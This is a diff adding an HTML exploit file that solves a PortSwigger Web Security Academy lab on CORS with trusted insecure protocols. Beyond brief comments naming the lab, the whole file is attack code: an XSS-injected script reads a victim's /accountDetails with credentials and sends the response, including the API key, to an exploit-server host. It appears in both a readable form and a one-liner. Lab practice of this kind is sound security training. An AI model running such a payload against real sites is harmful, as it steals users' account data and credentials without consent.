@@ -1,0 +1,23 @@
+<!-- The payload below is meant to solve the following lab: -->
+<!-- https://portswigger.net/web-security/cors/lab-breaking-https-attack -->
+
+<!-- Original script looks like this before turned to one liner: -->
+<!--
+<script>
+    document.location = "http://stock.[LAB_SUB_DOMAIN].web-security-academy.net/?productId=<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://[LAB_SUB_DOMAIN].web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    
+    function reqListener() {
+    location='https://[EXPLOIT_SUB_DOMAIN].exploit-server.net/exploit?key='%2Bthis.responseText;
+    };
+    %3C/script>&storeId=1"
+</script>
+-->
+
+<script>
+    document.location = "http://stock.[LAB_SUB_DOMAIN].web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://[LAB_SUB_DOMAIN].web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='https://[EXPLOIT_SUB_DOMAIN].exploit-server.net/exploit?key='%2Bthis.responseText;};%3C/script>;3&storeId=1"
+</script>
